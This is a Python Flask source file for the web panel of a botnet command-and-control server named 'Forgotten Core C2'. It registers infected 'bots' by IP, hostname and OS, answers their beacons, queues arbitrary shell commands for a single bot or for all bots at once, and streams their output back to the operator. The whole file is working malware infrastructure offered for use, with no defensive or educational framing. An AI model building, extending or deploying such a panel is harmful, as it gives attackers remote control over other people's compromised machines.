#!/usr/bin/env python3
# WEB PANEL DASHBOARD - Forgotten Core C2
from flask import Flask, render_template, request, jsonify, send_file
from flask_socketio import SocketIO, emit
from flask_cors import CORS
import json
import os
import time
import threading
import requests
from datetime import datetime
import sqlite3

app = Flask(__name__)
app.config['SECRET_KEY'] = 'forgotten_core_secret'
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*")

# Database setup
def init_db():
    conn = sqlite3.connect('c2_database.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS bots
                 (id TEXT PRIMARY KEY, ip TEXT, hostname TEXT, os TEXT, 
                  first_seen TEXT, last_seen TEXT, status TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, bot_id TEXT, 
                  command TEXT, status TEXT, result TEXT, timestamp TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS files
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, bot_id TEXT, 
                  filename TEXT, size INTEGER, timestamp TEXT)''')
    conn.commit()
    conn.close()

init_db()

# Bot data
bots = {}
commands = {}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/bots', methods=['GET'])
def get_bots():
    return jsonify({"bots": bots})

@app.route('/api/stats', methods=['GET'])
def get_stats():
    active = sum(1 for b in bots.values() if b.get('status') == 'active')
    return jsonify({
        "total": len(bots),
        "active": active,
        "offline": len(bots) - active
    })

@app.route('/api/register', methods=['POST'])
def register_bot():
    data = request.json
    bot_id = data.get('bot_id')
    bots[bot_id] = {
        "ip": data.get('ip'),
        "hostname": data.get('hostname'),
        "os": data.get('os'),
        "first_seen": str(datetime.now()),
        "last_seen": str(datetime.now()),
        "status": "active"
    }
    socketio.emit('bot_update', {'bot_id': bot_id, 'action': 'registered'})
    return jsonify({"status": "ok"})

@app.route('/api/beacon/<bot_id>', methods=['GET'])
def bot_beacon(bot_id):
    if bot_id in bots:
        bots[bot_id]['last_seen'] = str(datetime.now())
        bots[bot_id]['status'] = "active"
    
    if bot_id in commands and commands[bot_id]:
        cmd = commands[bot_id].pop(0)
        return jsonify({"command": cmd})
    return jsonify({}), 204

@app.route('/api/report/<bot_id>', methods=['POST'])
def bot_report(bot_id):
    data = request.json
    output = data.get('output', '')
    socketio.emit('bot_output', {'bot_id': bot_id, 'output': output})
    return jsonify({"status": "ok"})

@app.route('/api/send_command', methods=['POST'])
def send_command():
    data = request.json
    bot_id = data.get('bot_id')
    command = data.get('command')
    
    if bot_id == "all":
        for bid in bots:
            if bid not in commands:
                commands[bid] = []
            commands[bid].append(command)
        return jsonify({"status": f"Command sent to {len(bots)} bots"})
    else:
        if bot_id not in commands:
            commands[bot_id] = []
        commands[bot_id].append(command)
        return jsonify({"status": f"Command sent to {bot_id}"})

@app.route('/api/delete_bot/<bot_id>', methods=['DELETE'])
def delete_bot(bot_id):
    if bot_id in bots:
        del bots[bot_id]
        return jsonify({"status": "deleted"})
    return jsonify({"status": "not found"}), 404

@socketio.on('connect')
def handle_connect():
    emit('connected', {'data': 'Connected to C2 Server'})

if __name__ == '__main__':
    print("🚀 Web Panel C2 Server started on http://localhost:5050")
    socketio.run(app, host='0.0.0.0', port=5050, debug=False)
